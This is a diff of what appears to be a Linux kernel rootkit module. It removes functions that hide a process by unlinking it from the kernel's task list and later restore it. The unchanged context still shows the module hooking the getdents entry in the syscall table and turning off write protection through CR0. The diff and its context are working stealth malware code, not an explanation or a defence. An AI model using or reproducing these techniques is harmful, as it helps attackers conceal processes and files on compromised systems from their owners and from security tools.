@@ -13,8 +13,6 @@ MODULE_DESCRIPTION("Fallen Dragon, Peter F. Hamilton");
 
 static void **sys_call_table;
 static void **ia32_sys_call_table;
-static struct task_struct *process, *prev_process, *next_process;
-static struct list_head *process_entry;
 
 asmlinkage long (*real_getdents)(struct pt_regs *);
 
@@ -120,42 +118,6 @@ static void unhook_syscall(void) {
   sys_call_table[__NR_getdents] = real_getdents;
   
   write_cr0(read_cr0() | 0x10000);
-}
-
-static void hide_process(pid_t process_pid) {
-  if (process) {
-    printk(KERN_INFO "a process is already hidden, maximum reached");
-    return;
-  }
-
-  for_each_process(process) {
-    if (process->pid != process_pid)
-      continue;
-
-    prev_process = list_entry(process->tasks.prev, struct task_struct, tasks);
-    next_process = list_entry(process->tasks.next, struct task_struct, tasks);
-
-    process_entry = prev_process->tasks.next;
-
-    prev_process->tasks.next = process->tasks.next;
-    next_process->tasks.prev = process->tasks.prev;
-
-    printk(KERN_INFO "process %d is now hidden", process->pid);
-    break;
-  }
-}
-
-static void unhide_process(void) {
-  if (!process) {
-    printk(KERN_INFO "no program is hidden");
-    return;
-  }
-
-  prev_process->tasks.next = process_entry;
-  next_process->tasks.prev = process_entry;
-
-  printk(KERN_INFO "process %d is now revealed", process->pid);
-  process = NULL;
 }
 
 int init_module(void) {
